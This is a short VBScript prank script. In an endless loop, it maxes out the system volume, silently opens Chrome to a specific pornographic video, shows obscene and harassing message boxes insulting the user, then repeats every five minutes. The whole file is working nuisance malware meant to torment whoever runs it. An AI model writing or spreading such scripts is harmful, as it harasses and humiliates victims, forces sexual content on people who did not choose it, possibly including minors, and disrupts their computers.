do
Option Explicit
Dim URL,WshShell,i
URL = "https://www.pornhub.com/view_video.php?viewkey=ph5aa4c35c8a362"
Set WshShell = CreateObject("WScript.shell")
For i = 0 to 50
    WshShell.SendKeys(chr(175))
Next
WshShell.run "CMD /C start chrome.exe " & URL & "",0,False
wscript.sleep 45000
MsgBox ("I'm your computer.  Fuck you!")
MsgBox ("Also, stop masturbating to gay porn starring 95-year-old men!")
wscript.sleep 300000
loop
